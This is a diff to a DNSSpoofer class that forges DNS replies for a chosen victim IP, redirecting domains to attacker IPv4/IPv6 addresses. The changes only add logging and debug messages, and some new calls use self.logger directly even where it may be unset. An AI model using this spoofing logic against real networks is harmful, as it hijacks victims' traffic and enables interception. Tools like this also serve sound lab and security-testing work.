@@ -18,6 +18,12 @@ class DNSSpoofer:
     def stop(self):
         self.running = False
 
+    def log(self, msg):
+        if self.logger:
+            self.logger(msg)
+        else:
+            print(msg)
+
     def _get_src_ip(self, packet):
         if packet.haslayer(IP):
             return packet[IP].src, IP
@@ -35,10 +41,12 @@ class DNSSpoofer:
                 packet[UDP].dport == 53 and
                 packet.haslayer(DNSQR)
             ):
+                # self.logger("No DNS query")
                 return False
 
             src_ip, ip_layer = self._get_src_ip(packet)
             if src_ip != self.victim_ip:
+                self.logger("not correct IP")
                 return False
 
             qname = packet[DNSQR].qname
@@ -52,6 +60,7 @@ class DNSSpoofer:
             spoof_ip = self.dns_mapping.get(domain)
 
             if not spoof_ip:
+                self.logger(f"not spoof IP for {domain}")
                 return False
 
             # Determine record type
@@ -62,6 +71,7 @@ class DNSSpoofer:
                 rdata = self.attacker_ipv6
                 rr_type = "AAAA"
             else:
+                self.logger("not record type")
                 return False
 
             # Build response
